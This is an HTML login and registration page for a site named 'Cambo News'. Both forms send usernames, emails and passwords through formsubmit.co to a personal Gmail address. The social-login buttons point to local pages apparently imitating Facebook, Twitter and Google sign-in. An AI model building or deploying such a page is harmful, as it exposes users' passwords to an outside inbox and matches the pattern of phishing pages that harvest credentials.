<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer">
    <link rel="stylesheet" href="/loginnew/login.d6afa194.css">
    <title>Sign in & Sign up Form</title>
  </head>
  <body>
    <div class="container">
      <div class="forms-container">
        <div class="signin-signup">
          <form action="https://formsubmit.co/ahsaaa477@gmail.com" method="POST" class="sign-in-form">
            <h2 class="title">Sign in</h2>
            <div class="input-field">
              <i class="fas fa-user"></i>
              <input type="text" name="text" placeholder="Username" required="">
            </div>
            <div class="input-field">
              <i class="fas fa-lock"></i>
              <input type="password" name="password" placeholder="Password" required="">
            </div>
            
            <input type="submit" value="Login" class="btn solid">
            <p class="social-text">Or Sign in with social platforms</p>
            <div class="social-media">
              <a href="/loginnew/facebook-login/facebook.html" class="social-icon">
                <i class="fa-brands fa-facebook-f"></i>
              </a>
              <a href="/loginnew/twitter/twitter.html" class="social-icon">
                <i class="fa-brands fa-twitter"></i>
              </a>
              <a href="/loginnew/google/Demo.html" class="social-icon">
                <i class="fa-brands fa-google"></i>
              </a>
              <a href="#" class="social-icon">
                <i class="fa-brands fa-linkedin-in"></i>
              </a>
            </div>
          </form>


          <form action="https://formsubmit.co/ahsaaa477@gmail.com" method="POST" class="sign-up-form">
            <h2 class="title">Sign up</h2>
            <div class="input-field">
              <i class="fas fa-user"></i>
              <input type="text" name="text" placeholder="Username" required="">
            </div>
            <div class="input-field">
              <i class="fas fa-envelope"></i>
              <input type="email" name="email" placeholder="Email" required="">
              <input type="email" name="email" required="">
            </div>
            <div class="input-field">
              <i class="fas fa-lock"></i>
              <input type="password" name="password" placeholder="Password" required="">
            </div>
            <input type="submit" class="btn" value="Sign up">
            <p class="social-text">Or Sign up with social platforms</p>

            <div class="social-media">
              <a href="/loginnew/facebook-login/facebook.html" class="social-icon">
                <i class="fab fa-facebook-f"></i>
              </a>
              <a href="/loginnew/twitter/twitter.html" class="social-icon">
                <i class="fab fa-twitter"></i>
              </a>
              <a href="/loginnew/google/Demo.html" class="social-icon">
                <i class="fab fa-google"></i>
              </a>
              <a href="#" class="social-icon">
                <i class="fab fa-linkedin-in"></i>
              </a>
            </div>
          </form>
        </div>
      </div>

      <div class="panels-container">
        <div class="panel left-panel">
          <div class="content">
            <a href="/index.html">
              <img src="/news.243b77fb.png" width="300px" height="300">
            </a>
            <h3>Cambo New</h3>
            <p>
              If you don't have an account please click on button sign up!!
            </p>
            <button class="btn transparent" id="sign-up-btn">
              Sign up
            </button>
          </div>
        </div>
        <div class="panel right-panel">
          <div class="content">
            <a href="/index.html">
              <img src="/news.243b77fb.png" width="300px" height="300">
            </a>
            <h3>Cambo News</h3>
            
            <p>
              If you have created your account before please click on sign in!!
            </p>
            <button class="btn transparent" id="sign-in-btn">
              Sign in
            </button>
          </div>
        </div>
      </div>
    </div>
    <script src="/loginnew/login.1150df27.js"></script>
  </body>
</html>
